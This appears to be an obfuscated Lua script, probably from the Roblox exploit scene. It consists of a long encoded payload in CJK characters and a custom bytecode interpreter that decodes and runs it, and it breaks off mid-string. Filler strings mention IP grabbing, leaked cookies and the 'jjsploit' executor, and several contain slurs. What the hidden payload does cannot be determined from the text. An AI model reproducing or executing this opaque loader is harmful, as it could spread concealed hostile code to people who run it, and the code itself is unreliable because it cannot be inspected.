㒠㒥㒟㒤㒟㒚㒞㒜㒝㒠㒜㒤㒜㒞㒜㒘㒚㒠㒙㒤㒙㒘㒘㒦㒗㒠㒦㒥㒦㒘㒥㒞㒤㒠㒤㒘㒤㒟㒢㒜㒡㒠㒠㒤㒠㒢㒟㒜㒞㒡㒝㒤㒞㒚㒢㒝㒛㒠㒚㒤㒚㒘㒙㒢㒘㒠㒗㒤㒗㒘㒦㒜㒛㒟㒤㒤㒤㒘㒣㒜㒢㒢㒡㒤㒡㒘㒠㒜㒟㒠㒦㒗㒞㒘㒝㒜㒜㒠㒛㒥㒛㒘㒚㒜㒙㒠㒘㒤㒘㒘㒗㒜㒦㒠㒥㒤㒦㒠㒤㒜㒣㒠㒢㒤㒡㒚㒡㒣㒠㒠㒟㒤㒟㒘㒣㒢㒣㒥㒣㒗㒣㒜㒢㒛㒡㒢㒝㒗㒦㒜㒘㒤㒗㒠㒦㒤㒦㒘㒚㒜㒛㒟㒛㒗㒙㒡㒙㒠㒘㒙㒗㒣㒦㒦㒦㒦㒟㒞㒝㒤㒝㒘㒜㒜㒟㒦㒡㒝㒠㒦㒟㒠㒜㒦㒞㒝㒞㒚㒝㒟㒜㒤㒙㒗㒚㒠㒙㒥㒙㒜㒘㒘㒜㒞㒡㒘㒟㒠㒞㒤㒞㒘㒢㒞㒢㒡㒢㒗㒡㒝㒟㒜㒠㒢㒟㒣㒞㒟㒞㒞㒜㒥㒝㒗㒜㒛㒚㒘㒣㒣㒢㒤㒢㒘㒡㒜㒗㒞㒦㒙㒦㒟㒞㒞㒞㒘㒜㒤㒜㒘㒛㒜㒟㒙㒡㒗㒝㒙㒞㒟㒞㒤㒝㒝㒝㒞㒛㒡㒤㒠㒣㒤㒣㒘㒢㒜㒡㒠㒠㒤㒠㒘㒟㒜㒞㒠㒙㒜㒝㒙㒞㒜㒛㒦㒚㒤㒚㒘㒙㒜㒝㒣㒞㒗㒞㒚㒜㒥㒜㒠㒜㒘㒟㒞㒣㒡㒢㒠㒡㒤㒡㒘㒥㒢㒥㒡㒥㒠㒥㒝㒣㒡㒛㒢㒜㒟㒛㒘㒚㒜㒙㒠㒝㒗㒞㒠㒝㒡㒜㒣㒜㒟㒜㒘㒛㒛㒚㒙㒙㒢㒙㒜㒘㒟㒦㒜㒠㒢㒟㒘㒞㒜㒝㒠㒡㒛㒢㒝㒢㒠㒞㒤㒠㒙㒠㒛㒞㒟㒝㒥㒝㒢㒜㒜㒛㒝㒛㒞㒛㒘㒚㒛㒘㒘㒡㒤㒠㒤㒠㒘㒟㒜㒥㒗㒣㒥㒣㒥㒢㒡㒚㒢㒛㒘㒚㒘㒙㒜㒘㒠㒜㒢㒝㒙㒝㒙㒛㒥㒤㒦㒤㒡㒣㒜㒢㒠㒡㒤㒦㒟㒗㒛㒦㒢㒥㒟㒥㒛㒤㒜㒢㒡㒢㒗㒡㒝㒞㒚㒙㒥㒘㒤㒘㒘㒗㒜㒛㒢㒛㒥㒛㒛㒚㒡㒚㒣㒢㒦㒢㒦㒡㒜㒠㒠㒟㒤㒣㒟㒥㒛㒣㒡㒣㒠㒠㒛㒡㒤㒠㒥㒠㒗㒟㒣㒟㒜㒞㒟㒝㒝㒜㒦㒜㒠㒘㒞㒤㒞㒣㒘㒢㒜㒡㒠㒥㒗㒦㒠㒥㒡㒤㒣㒤㒟㒤㒘㒣㒛㒢㒙㒡㒢㒡㒜㒝㒚㒘㒥㒗㒤㒗㒘㒦㒜㒜㒠㒚㒥㒚㒡㒚㒞㒙㒣㒠㒤㒡㒘㒠㒜㒟㒠㒞㒤㒞㒘㒝㒜㒠㒚㒗㒤㒝㒘㒚㒢㒙㒠㒘㒤㒘㒘㒜㒜㒜㒡㒜㒦㒛㒝㒛㒚㒚㒤㒦㒠㒢㒘㒡㒜㒠㒠㒟㒤㒟㒘㒞㒜㒢㒙㒘㒤㒞㒘㒛㒠㒚㒠㒙㒤㒙㒘㒝㒞㒝㒡㒝㒗㒜㒝㒢㒠㒥㒚㒣㒤㒣㒘㒢㒜㒦㒗㒗㒙㒗㒜㒤㒟㒤㒥㒤㒦㒤㒞㒢㒥㒡㒣㒡㒙㒞㒥㒙㒜㒘㒠㒗㒤㒘㒚㒘㒞㒥㒠㒤㒤㒤㒘㒤㒟㒢㒠㒡㒤㒡㒘㒡㒞㒟㒠㒞㒤㒞㒙㒝㒜㒝㒝㒛㒤㒛㒘㒚㒜㒛㒠㒘㒤㒘㒘㒗㒝㒦㒠㒥㒥㒥㒘㒥㒤㒣㒠㒣㒦㒢㒘㒡㒜㒠㒣㒟㒤㒠㒗㒞㒜㒝㒠㒜㒤㒜㒘㒛㒜㒚㒠㒙㒥㒙㒘㒘㒟㒗㒠㒦㒦㒦㒘㒗㒜㒤㒠㒣㒤㒣㒙㒢㒜㒡㒡㒠㒤㒡㒘㒟㒜㒠㒠㒝㒤㒝㒘㒜㒝㒛㒠㒚㒥㒚㒘㒚㒣㒘㒠㒙㒤㒗㒘㒦㒜㒥㒡㒤㒤㒤㒙㒣㒜㒣㒛㒡㒤㒣㒘㒠㒜㒟㒠㒞㒥㒞㒘㒝㒝㒜㒠㒜㒠㒛㒘㒚㒜㒙㒠㒘㒤㒘㒙㒗㒜㒦㒢㒥㒤㒥㒘㒤㒜㒣㒠㒢㒤㒢㒘㒡㒜㒠㒠㒟㒤㒟㒘㒞㒞㒝㒠㒝㒘㒜㒘㒛㒜㒚㒠㒙㒤㒝㒢㒘㒜㒗㒡㒦㒤㒘㒘㒚㒜㒤㒠㒤㒙㒣㒘㒢㒠㒡㒠㒡㒢㒠㒘㒡㒢㒟㒦㒝㒤㒝㒝㒜㒜㒠㒚㒚㒤㒚㒙㒙㒜㒘㒦㒗㒤㒗㒜㒗㒣㒥㒠㒤㒤㒤㒘㒗㒦㒢㒠㒡㒥㒡㒘㒡㒞㒥㒠㒞㒤㒞㒝㒝㒜㒝㒝㒛㒤㒛㒘㒚㒜㒛㒠㒜㒞㒘㒘㒗㒡㒦㒠㒦㒙㒥㒘㒥㒤㒣㒠㒣㒦㒢㒘㒡㒜㒡㒗㒟㒤㒠㒗㒞㒜㒝㒠㒜㒤㒜㒘㒛㒜㒚㒠㒚㒙㒙㒘㒘㒣㒗㒠㒦㒦㒦㒘㒗㒜㒤㒠㒣㒤㒣㒝㒢㒜㒡㒥㒠㒤㒡㒘㒟㒜㒠㒠㒝㒤㒝㒘㒜㒡㒛㒠㒛㒙㒚㒘㒚㒣㒘㒠㒙㒤㒗㒘㒦㒜㒥㒥㒤㒤㒤㒝㒣㒜㒣㒙㒡㒤㒣㒘㒠㒜㒟㒠㒟㒙㒞㒘㒝㒡㒜㒠㒜㒘㒛㒘㒜㒜㒙㒠㒘㒤㒘㒝㒗㒜㒦㒥㒥㒤㒥㒢㒤㒜㒥㒦㒢㒤㒢㒘㒡㒡㒠㒠㒡㒟㒟㒘㒞㒝㒝㒠㒝㒜㒜㒘㒛㒠㒜㒗㒙㒤㒙㒘㒘㒜㒙㒛㒦㒤㒦㒙㒥㒜㒤㒤㒥㒛㒣㒘㒢㒜㒡㒠㒥㒞㒠㒘㒟㒝㒞㒠㒞㒦㒣㒘㒜㒜㒛㒥㒚㒤㒚㒥㒙㒜㒘㒠㒗㒤㒙㒘㒘㒠㒥㒠㒥㒙㒤㒘㒣㒡㒢㒠㒣㒜㒡㒘㒡㒞㒟㒠㒞㒤㒞㒟㒝㒜㒝㒟㒛㒤㒛㒘㒚㒜㒙㒠㒘㒤㒘㒘㒗㒡㒦㒠㒦㒛㒥㒘㒤㒞㒣㒠㒤㒤㒢㒘㒡㒜㒠㒥㒟㒤㒟㒝㒞㒜㒞㒠㒜㒤㒞㒘㒛㒜㒚㒠㒚㒙㒙㒘㒘㒡㒗㒠㒘㒛㒦㒘㒗㒜㒤㒠㒣㒤㒣㒝㒢㒜㒡㒥㒠㒤㒡㒙㒟㒜㒠㒠㒝㒤㒝㒘㒜㒡㒛㒠㒛㒙㒚㒘㒙㒢㒘㒠㒙㒤㒗㒘㒦㒜㒥㒥㒤㒤㒤㒝㒣㒜㒣㒚㒡㒤㒣㒞㒠㒜㒟㒠㒟㒙㒞㒘㒠㒤㒜㒠㒛㒥㒛㒘㒚㒤㒙㒠㒙㒘㒙㒟㒗㒜㒦㒠㒥㒤㒘㒠㒤㒜㒣㒡㒢㒤㒢㒘㒥㒝㒠㒠㒠㒙㒟㒘㒞㒜㒝㒠㒜㒤㒜㒘㒝㒜㒚㒦㒙㒤㒙㒞㒘㒜㒗㒤㒦㒤㒗㒝㒥㒜㒦㒠㒣㒤㒣㒘㒢㒢㒡㒠㒡㒚㒠㒘㒠㒡㒞㒠㒟㒤㒝㒘㒜㒜㒛㒦㒚㒤㒚㒞㒙㒜㒙㒥㒗㒤㒙㒘㒦㒜㒥㒠㒥㒚㒤㒘㒣㒢㒢㒠㒢㒗㒡㒘㒡㒞㒟㒠㒞㒤㒞㒠㒝㒜㒝㒡㒛㒤㒛㒘㒚㒜㒙㒠㒘㒤㒘㒘㒗㒢㒦㒠㒦㒜㒥㒘㒤㒞㒣㒠㒤㒤㒢㒘㒡㒜㒠㒦㒟㒤㒟㒞㒞㒜㒞㒡㒜㒤㒞㒘㒛㒜㒚㒠㒚㒚㒙㒘㒘㒢㒗㒠㒦㒦㒦㒘㒦㒞㒤㒠㒣㒤㒣㒟㒢㒜㒡㒡㒠㒤㒠㒘㒟㒜㒠㒠㒝㒤㒝㒘㒜㒣㒛㒠㒛㒛㒚㒘㒙㒡㒘㒠㒘㒦㒗㒘㒦㒜㒦㒘㒤㒤㒤㒟㒣㒜㒢㒠㒡㒤㒢㒚㒠㒜㒟㒠㒟㒝㒞㒘㒞㒢㒜㒠㒛㒤㒛㒘㒛㒞㒙㒠㒘㒤㒘㒢㒗㒜㒗㒗㒥㒤㒥㒘㒤㒜㒣㒠㒢㒤㒢㒘㒡㒣㒠㒠㒠㒞㒟㒘㒞㒞㒝㒠㒜㒤㒜㒘㒛㒜㒚㒦㒙㒤㒙㒞㒘㒜㒘㒗㒦㒤㒦㒘㒥㒜㒤㒠㒤㒙㒣㒘㒢㒞㒡㒠㒠㒥㒠㒘㒟㒠㒞㒠㒝㒤㒝㒘㒜㒜㒠㒚㒚㒤㒚㒙㒙㒜㒚㒠㒜㒤㒗㒘㒦㒡㒥㒠㒥㒘㒤㒘㒣㒦㒢㒠㒤㒚㒦㒡㒠㒜㒟㒥㒞㒤㒡㒤㒝㒜㒜㒡㒛㒤㒛㒠㒚㒜㒙㒤㒚㒛㒘㒘㒗㒜㒦㒠㒙㒠㒥㒘㒤㒝㒣㒠㒣㒘㒣㒟㒡㒜㒠㒠㒟㒤㒣㒢㒞㒜㒝㒡㒜㒤㒜㒘㒟㒝㒚㒠㒚㒙㒙㒘㒘㒜㒗㒠㒦㒤㒦㒘㒗㒜㒦㒡㒣㒤㒣㒞㒢㒜㒡㒤㒠㒤㒡㒝㒟㒜㒠㒠㒝㒤㒝㒘㒜㒢㒛㒠㒛㒚㒚㒘㒙㒟㒘㒠㒘㒦㒗㒘㒦㒜㒦㒘㒤㒤㒥㒚㒣㒜㒢㒠㒡㒤㒡㒘㒠㒜㒟㒠㒟㒚㒞㒘㒝㒤㒜㒠㒛㒦㒛㒘㒜㒜㒙㒠㒘㒤㒘㒞㒗㒜㒦㒦㒥㒤㒥㒚㒤㒜㒤㒢㒢㒤㒢㒘㒡㒣㒠㒠㒟㒥㒟㒘㒞㒜㒝㒠㒞㒤㒜㒘㒛㒜㒛㒗㒙㒤㒙㒟㒘㒜㒗㒥㒦㒤㒗㒚㒥㒜㒤㒠㒤㒜㒣㒘㒢㒣㒡㒠㒠㒤㒠㒘㒠㒞㒞㒠㒝㒤㒝㒡㒜㒜㒜㒤㒚㒤㒚㒘㒙㒜㒙㒢㒗㒤㒗㒘㒦㒦㒥㒠㒥㒛㒤㒘㒣㒜㒢㒠㒡㒤㒡㒘㒠㒜㒠㒗㒞㒤㒞㒢㒝㒜㒜㒢㒛㒤㒛㒘㒚㒜㒙㒠㒙㒚㒘㒘㒗㒢㒦㒠㒦㒛㒥㒘㒤㒜㒣㒠㒢㒤㒢㒝㒡㒜㒠㒢㒟㒤㒟㒙㒞㒜㒝㒦㒝㒠㒜㒘㒛㒜㒚㒠㒚㒠㒙㒘㒘㒝㒗㒠㒦㒦㒦㒘㒥㒠㒦㒗㒣㒤㒣㒘㒢㒜㒢㒜㒠㒤㒠㒙㒟㒜㒞㒠㒥㒗㒝㒘㒜㒜㒛㒠㒚㒥㒚㒘㒙㒜㒘㒠㒗㒤㒗㒘㒦㒜㒥㒠㒤㒤㒤㒣㒣㒜㒢㒠㒡㒤㒠㒚㒠㒟㒟㒠㒞㒤㒞㒘㒤㒚㒢㒥㒣㒛㒚㒚㒛㒗㒙㒠㒘㒤㒘㒘㒛㒞㒝㒥㒝㒘㒜㒜㒛㒛㒚㒞㒥㒦㒦㒜㒘㒛㒘㒗㒦㒢㒘㒞㒞㒜㒝㒠㒜㒤㒜㒘㒛㒜㒚㒠㒙㒤㒙㒘㒟㒦㒗㒦㒦㒤㒦㒘㒥㒜㒘㒣㒘㒚㒚㒚㒘㒝㒘㒝㒗㒙㒢㒘㒟㒣㒞㒠㒝㒤㒝㒘㒡㒢㒡㒥㒡㒗㒡㒜㒠㒛㒟㒢㒚㒦㒞㒢㒗㒙㒥㒠㒤㒤㒤㒘㒗㒟㒙㒥㒘㒦㒘㒚㒦㒡㒦㒞㒦㒘㒢㒛㒣㒝㒣㒝㒢㒙㒢㒚㒠㒝㒙㒢㒙㒝㒘㒘㒗㒜㒦㒠㒝㒛㒜㒗㒛㒞㒚㒛㒚㒗㒙㒘㒗㒝㒦㒣㒦㒙㒦㒢㒞㒠㒝㒠㒜㒤㒜㒘㒢㒣㒠㒡㒠㒝㒠㒜㒡㒢㒗㒠㒦㒤㒦㒘㒥㒜㒤㒠㒣㒤㒢㒘㒦㒛㒜㒦㒡㒝㒠㒘㒟㒜㒞㒠㒡㒦㒤㒝㒣㒠㒢㒤㒡㒣㒠㒦㒜㒞㒝㒥㒞㒤㒜㒤㒦㒞㒥㒠㒤㒤㒤㒘㒚㒢㒙㒥㒣㒞㒡㒘㒠㒜㒟㒠㒟㒦㒢㒛㒝㒜㒜㒠㒛㒤㒛㒣㒚㒜㒙㒠㒘㒤㒚㒘㒗㒜㒦㒠㒥㒤㒥㒘㒤㒜㒣㒠㒢㒦㒢㒘㒢㒞㒠㒠㒟㒤㒟㒚㒞㒜㒝㒥㒜㒤㒜㒘㒛㒜㒜㒠㒙㒤㒙㒘㒘㒞㒗㒠㒦㒦㒦㒘㒥㒝㒤㒠㒤㒦㒣㒘㒢㒜㒡㒣㒠㒤㒠㒛㒟㒜㒞㒠㒝㒤㒞㒚㒜㒜㒛㒠㒛㒘㒚㒘㒙㒟㒘㒠㒗㒤㒗㒘㒦㒜㒥㒠㒤㒤㒤㒚㒣㒜㒢㒤㒡㒤㒡㒚㒠㒜㒠㒢㒞㒤㒞㒘㒝㒟㒜㒠㒜㒛㒛㒘㒚㒜㒙㒠㒚㒤㒘㒘㒗㒜㒦㒣㒥㒤㒥㒛㒤㒜㒣㒦㒢㒤㒤㒘㒡㒜㒠㒠㒠㒗㒟㒘㒞㒟㒝㒠㒝㒘㒜㒘㒛㒜㒚㒠㒙㒤㒙㒘㒘㒜㒗㒣㒦㒤㒦㒙㒥㒜㒥㒢㒣㒤㒣㒘㒢㒜㒡㒠㒡㒜㒠㒘㒟㒜㒞㒠㒞㒦㒝㒘㒜㒜㒛㒡㒚㒤㒚㒡㒙㒜㒘㒠㒗㒤㒗㒘㒦㒜㒥㒠㒤㒤㒤㒘㒣㒞㒢㒠㒡㒥㒡㒘㒡㒞㒟㒠㒞㒤㒞㒘㒝㒜㒝㒛㒛㒤㒛㒘㒚㒜㒛㒠㒘㒤㒘㒘㒗㒜㒦㒠㒥㒤㒥㒘㒤㒦㒣㒠㒣㒦㒢㒘㒡㒜㒠㒢㒟㒤㒟㒝㒞㒜㒝㒠㒜㒤㒞㒘㒛㒜㒚㒠㒙㒦㒙㒘㒘㒞㒗㒠㒦㒥㒦㒘㒦㒞㒤㒠㒣㒤㒣㒛㒢㒜㒡㒣㒠㒤㒠㒘㒟㒜㒟㒢㒝㒤㒝㒘㒜㒠㒛㒠㒛㒗㒚㒘㒙㒜㒘㒠㒗㒤㒗㒘㒦㒜㒥㒢㒤㒤㒤㒜㒣㒜㒢㒢㒡㒤㒢㒚㒠㒜㒟㒠㒟㒗㒞㒘㒝㒣㒜㒠㒛㒤㒛㒘㒜㒜㒙㒠㒘㒤㒘㒛㒗㒜㒦㒣㒥㒤㒥㒞㒤㒜㒥㒠㒢㒤㒢㒘㒡㒟㒠㒠㒠㒗㒟㒘㒞㒠㒝㒠㒜㒤㒜㒘㒛㒜㒚㒠㒙㒤㒙㒛㒘㒜㒗㒡㒦㒤㒦㒘㒥㒜㒤㒠㒣㒤㒣㒘㒢㒝㒡㒠㒠㒤㒠㒘㒟㒜㒞㒠㒝㒤㒝㒘㒜㒜㒜㒝㒚㒤㒚㒘㒙㒜㒚㒠㒘㒘㒗㒘㒦㒜㒥㒠㒙㒢㒚㒙㒚㒙㒘㒥㒥㒢㒡㒢㒠㒜㒟㒠㒞㒤㒢㒟㒣㒡㒣㒤㒡㒗㒡㒝㒡㒞㒠㒦㒟㒝㒞㒛㒝㒡㒞㒚㒦㒜㒥㒘㒤㒜㒣㒠㒗㒝㒙㒛㒥㒝㒦㒣㒗㒘㒥㒡㒥㒢㒣㒥㒦㒜㒜㒜㒛㒜㒚㒠㒙㒤㒟㒟㒞㒝㒞㒝㒝㒙㒝㒢㒦㒚㒤㒠㒣㒤㒣㒘㒦㒣㒗㒥㒘㒘㒤㒜㒥㒡㒥㒣㒤㒗㒣㒝㒣㒚㒡㒤㒠㒥㒠㒦㒠㒠㒟㒣㒥㒘㒗㒜㒦㒜㒥㒠㒤㒤㒙㒚㒙㒝㒘㒣㒘㒙㒤㒦㒠㒡㒟㒠㒞㒤㒞㒘㒢㒢㒢㒡㒢㒠㒢㒝㒠㒡㒝㒞㒙㒙㒘㒘㒗㒜㒦㒠㒜㒤㒛㒙㒚㒥㒚㒢㒚㒗㒥㒦㒡㒡㒠㒠㒟㒤㒟㒘㒣㒞㒣㒡㒣㒗㒢㒝㒢㒟㒞㒞㒚㒢㒙㒘㒘㒜㒗㒠㒛㒛㒝㒗㒛㒝㒛㒜㒘㒗㒙㒠㒘㒡㒗㒣㒗㒟㒗㒘㒦㒛㒥㒙㒤㒢㒤㒜㒥㒤㒜㒛㒚㒤㒚㒘㒙㒜㒜㒣㒞㒜㒝㒝㒜㒟㒜㒛㒛㒤㒛㒗㒙㒥㒙㒞㒙㒘㒘㒛㒢㒞㒟㒡㒢㒢㒞㒡㒝㒜㒜㒠㒛㒤㒠㒟㒡㒛㒠㒢㒟㒟㒟㒛㒞㒜㒜㒡㒜㒗㒛㒝㒦㒡㒣㒠㒢㒤㒢㒘㒢㒞㒢㒢㒟㒤㒟㒘㒞㒜㒞㒘㒜㒤㒜㒘㒛㒜㒛㒢㒙㒤㒙㒘㒘㒝㒗㒠㒗㒘㒦㒘㒥㒜㒤㒠㒥㒤㒣㒘㒢㒜㒡㒡㒠㒤㒠㒙㒟㒜㒞㒢㒝㒤㒞㒚㒜㒜㒛㒠㒛㒗㒚㒘㒚㒙㒘㒠㒗㒤㒗㒘㒦㒜㒥㒠㒤㒤㒤㒙㒣㒜㒢㒣㒡㒤㒡㒚㒠㒜㒡㒠㒞㒤㒞㒘㒝㒝㒜㒠㒛㒥㒛㒘㒚㒥㒙㒠㒚㒤㒘㒘㒗㒜㒦㒡㒥㒤㒥㒙㒤㒜㒣㒦㒢㒤㒤㒘㒡㒜㒠㒠㒟㒥㒟㒘㒞㒝㒝㒠㒝㒟㒜㒘㒝㒜㒚㒠㒙㒤㒙㒙㒘㒜㒗㒡㒦㒤㒦㒝㒥㒜㒤㒠㒣㒤㒣㒘㒢㒝㒡㒠㒠㒦㒠㒘㒟㒜㒞㒠㒝㒤㒝㒘㒜㒜㒛㒠㒚㒤㒚㒘㒙㒜㒘㒢㒗㒤㒗㒜㒦㒜㒥㒠㒤㒤㒤㒘㒥㒜㒢㒠㒡㒥㒡㒘㒢㒜㒤㒠㒞㒤㒞㒝㒝㒜㒜㒤㒛㒤㒛㒙㒚㒜㒛㒦㒚㒚㒘㒘㒗㒡㒦㒠㒗㒤㒥㒘㒤㒝㒣㒠㒣㒗㒢㒘㒡㒠㒢㒗㒟㒤㒟㒘㒞㒜㒟㒠㒜㒤㒜㒙㒛㒜㒜㒠㒞㒤㒙㒘㒘㒡㒗㒠㒗㒘㒦㒘㒥㒣㒤㒠㒦㒚㒘㒡㒢㒜㒡㒥㒠㒤㒡㒦㒟㒜㒞㒡㒝㒤㒝㒤㒜㒜㒛㒤㒜㒛㒚㒘㒙㒜㒘㒠㒙㒢㒗㒘㒦㒝㒥㒠㒥㒦㒚㒘㒣㒜㒢㒥㒡㒤㒡㒜㒠㒜㒟㒠㒞㒤㒠㒘㒠㒦㒜㒠㒜㒙㒛㒘㒚㒡㒙㒠㒘㒦㒘㒘㒘㒞㒦㒠㒥㒤㒥㒟㒤㒜㒤㒝㒢㒤㒢㒘㒡㒜㒠㒠㒟㒤㒟㒘㒞㒡㒝㒠㒝㒛㒜㒘㒛㒞㒚㒠㒛㒤㒙㒘㒘㒜㒗㒥㒦㒤㒦㒝㒥㒜㒥㒙㒣㒤㒥㒘㒢㒜㒡㒠㒡㒙㒠㒘㒟㒡㒞㒠㒞㒚㒝㒘㒞㒜㒛㒠㒚㒤㒚㒝㒙㒜㒘㒥㒗㒤㒗㒢㒦㒜㒗㒠㒤㒤㒤㒘㒣㒡㒢㒠㒢㒙㒡㒘㒠㒟㒟㒠㒠㒤㒞㒘㒝㒜㒜㒥㒛㒤㒛㒝㒚㒜㒚㒗㒘㒤㒚㒞㒗㒜㒦㒠㒦㒙㒥㒘㒦㒚㒣㒠㒢㒥㒢㒘㒢㒘㒠㒠㒠㒘㒠㒟㒞㒜㒝㒠㒜㒤㒝㒦㒛㒜㒚㒡㒙㒤㒙㒜㒙㒣㒗㒠㒦㒤㒦㒘㒗㒜㒤㒠㒣㒥㒣㒘㒢㒜㒣㒙㒠㒤㒠㒝㒟㒜㒞㒡㒝㒤㒝㒘㒜㒜㒛㒠㒠㒣㒚㒘㒙㒡㒘㒠㒗㒦㒗㒘㒦㒜㒥㒠㒥㒚㒤㒤㒣㒜㒢㒠㒡㒤㒡㒤㒠㒜㒟㒡㒞㒤㒞㒚㒝㒜㒜㒤㒝㒛㒛㒘㒚㒜㒙㒠㒙㒠㒘㒘㒗㒝㒦㒠㒥㒤㒦㒡㒤㒜㒣㒠㒢㒤㒢㒘㒡㒜㒠㒠㒟㒤㒟㒘㒤㒛㒝㒠㒜㒤㒜㒘㒛㒞㒚㒠㒙㒤㒙㒘㒘㒜㒞㒣㒦㒤㒦㒘㒥㒜㒤㒡㒣㒤㒣㒘㒢㒜㒡㒠㒠㒤㒠㒘㒟㒜");local m=(-#{(function()return#{('oolobl'):find("\108")}>0 and 1 or 0 end);'}','}'}+15)local l=47 local o=n;local e={}e={[(53-0x34)]=function()local n,i,d,e=j(H,o,o+y);o=o+D;l=(l+(m*D))%a;return(((e+l-(m)+r*(D*_))%r)*((_*A)^_))+(((d+l-(m*_)+r*(_^y))%a)*(r*a))+(((i+l-(m*y)+A)%a)*r)+((n+l-(m*D)+A)%a);end,[(52/0x1a)]=function(e,e,e)local e=j(H,o,o);o=o+i;l=(l+(m))%a;return((e+l-(m)+A)%r);end,[(0x3b+-56)]=function()local e,d=j(H,o,o+_);l=(l+(m*_))%a;o=o+_;return(((d+l-(m)+r*(_*D))%r)*a)+((e+l-(m*_)+a*(_^y))%r);end,[(-#"jjsploit winning"+(163-(0x1658/40)))]=function(o,e,l)if l then local e=(o/_^(e-n))%_^((l-i)-(e-n)+i);return e-e%n;else local e=_^(e-i);return(o%(e+e)>=e)and n or p;end;end,[(835/0xa7)]=function()local o=e[(0x22/34)]();local d=e[(-#[[jtoh is cringe ngl]]+(0x8fb/121))]();local c=n;local l=(e[(((-#"IP grabbed"+(404-0x100))-0x7b)+-#'fix ownerof')](d,i,I+D)*(_^(I*_)))+o;local o=e[(105-0x65)](d,21,31);local e=((-n)^e[(-#"What I gotta do to get it through to you Im superhuman"+((0x1ae-275)-97))](d,32));if(o==p)then if(l==v)then return e*p;else o=i;c=v;end;elseif(o==(r*(_^y))-i)then return(l==p)and(e*(i/v))or(e*(p/v));end;return T(e,o-((a*(D))-n))*(c+(l/(_^J)));end,[(-#'Your cookie has been leaked'+(-0x1c+61))]=function(d,c,c)local c;if(not d)then d=e[(67-0x42)]();if(d==p)then return'';end;end;c=q(H,o,o+d-n);o=o+d;local e=''for o=i,#c do e=K(e,z((j(q(c,o,o))+l)%a))l=(l+m)%r end return e;end}local function q(...)return{...},Y('#',...)end local function A()local x={};local b={};local o={};local k={x,b,nil,o};local l={}local w=(0x10ab/251)local d={[(0x70/(0x189c/225))]=(function(o)return not(#o==e[(-#[[made by kim jong un]]+(4662/0xde))]())end),[((-107+(165+-0x2e))+-#'impulse 2022')]=(function(o)return e[(-#"free pornhub premium"+(104-0x4f))]()end),[(68+-0x42)]=(function(o)return e[(0x29-35)]()end),[((620/0x7c)+-#[[mald]])]=(function(o)local l=e[(0x31-43)]()local o=''local e=1 for d=1,#l do e=(e+w)%a o=K(o,z((j(l:sub(d,d))+e)%r))end return o end)};k[3]=e[(-#"alivephoneluaLMAO"+(0x4d-58))]();local o=e[(-#'nigglet'+(-0x58+96))]()for o=1,o do local e=e[(-#[[anime is for fags]]+(-0x54+103))]();local n;local e=d[e%((146+-0x69)+-#'mysecondegg')];l[o]=e and e({});end;for a=1,e[(255/0xff)]()do local o=e[(122/0x3d)]();if(e[(0x22-30)](o,n,i)==v)then local b=e[(0x8c/35)](o,_,y);local d=e[(0x33+-47)](o,D,_+D);local o={e[(591/0xc5)](),e[((112-0x47)+-#"hol on leme chec ur seirc histori toll")](),nil,nil};local r={[(30+-0x1e)]=function()o[h]=e[((0x7d+-90)+-#'i bought a boost for this string')]();o[M]=e[(0x7f+-124)]();end,[((152-0x60)-0x37)]=function()o[t]=e[(0x6f/(20757/0xbb))]();end,[(0xc8/((0x100-147)+-#"hamburger"))]=function()o[O]=e[(-#[[flat]]+(-0x24+41))]()-(_^I)end,[(-0x59+92)]=function()o[h]=e[(0x48+(-10011/0x8d))]()-(_^I)o[S]=e[(369/0x7b)]();end};r[b]();if(e[(0x50/20)](d,i,n)==i)then o[c]=l[o[c]]end if(e[(0x1b-23)](d,_,_)==n)then o[h]=l[o[h]]end if(e[(121+-0x75)](d,y,y)==i)then o[B]=l[o[S]]end x[a]=o;end end;for e=i,e[(-#'turi ip ip ip'+(0xbec/(-105+0x143)))]()do b[e-i]=A();end;return k;end;local function v(e,p,m)local j=e[_];local r=e[y];local o=e[n];return(function(...)local z={};local e=n e*=-1 local D=e;local H={...};local a=o;local I={};local l={};local o=n;local r=r;local y=q local A=Y('#',...)-i;local j=j;for e=0,A do if(e>=r)then z[e-r]=H[e+i];else l[e]=H[e+n];end;end;local e=A-r+n local e;local r;while true do e=a[o];r=e[(22-0x15)];d=(141218)while((16617/0xbf)+-#"use luraph if want lost money")>=r do d-= d d=(14477584)while(0x9a-126)>=r do d-= d d=(3021954)while r<=(32+-0x13)do d-= d d=(13174973)while r<=(-#'fix ownerof'+(0x69+-88))do d-= d d=(11620224)while(0x66+-100)>=r do d-= d d=(7074360)while(0x0/22)>=r do d-= d local r;local d;d=e[x]l[d]=l[d](P(l,d+n,e[s]))o=o+n;e=a[o];d=e[f];r=l[e[u]];l[d+1]=r;l[d]=r[e[C]];o=o+n;e=a[o];l[e[b]]=e[u];o=o+n;e=a[o];d=e[f]l[d]=l[d](P(l,d+n,e[t]))o=o+n;e=a[o];d=e[c];r=l[e[h]];l[d+1]=r;l[d]=r[e[N]];o=o+n;e=a[o];l[e[x]]=e[u];o=o+n;e=a[o];d=e[w]l[d]=l[d](P(l,d+n,e[t]))o=o+n;e=a[o];d=e[w];r=l[e[h]];l[d+1]=r;l[d]=r[e[C]];o=o+n;e=a[o];l[e[w]]=e[t];o=o+n;e=a[o];l[e[k]]=e[U];break;end while 1828==(d)/((-#'Well thats what they do when they get jealous they confuse it'+(0x63cf8/104)))do d=(608322)while(0x2c+-43)<r do d-= d local e=e[f]l[e](l[e+i])break end while(d)/((683-0x18d))==2127 do local r;local t,h;local i;local d;m[e[O]]=l[e[b]];o=o+n;e=a[o];l[e[k]]=m[e[s]];o=o+n;e=a[o];l[e[b]]=m[e[O]];o=o+n;e=a[o];d=e[x];i=l[e[O]];l[d+1]=i;l[d]=i[e[B]];o=o+n;e=a[o];l[e[b]]=e[O];o=o+n;e=a[o];d=e[w]t,h=y(l[d](P(l,d+1,e[U])))D=h+d-1 r=0;for e=d,D do r=r+n;l[e]=t[r];end;o=o+n;e=a[o];d=e[c]l[d]=l[d](P(l,d+n,D))o=o+n;e=a[o];d=e[b]l[d]=l[d]()o=o+n;e=a[o];l[e[w]]=l[e[U]][e[N]];o=o+n;e=a[o];l[e[b]]=e[u];break end;break;end break;end while(d)/((-#'Smokey BArbecue BAcon BUford from checkers mm'+(0x1d1a-3737)))==3168 do d=(693692)while(-#'Should have used luraph'+(164-0x89))>=r do d-= d d=(7007550)while r>(0x31+-46)do d-= d local e=e[w]local d,o=y(l[e](l[e+i]))D=o+e-n local o=0;for e=e,D do o=o+n;l[e]=d[o];end;break end while 2325==(d)/(((6285-0xc85)+-#"I have stolen your father figure and all your milk 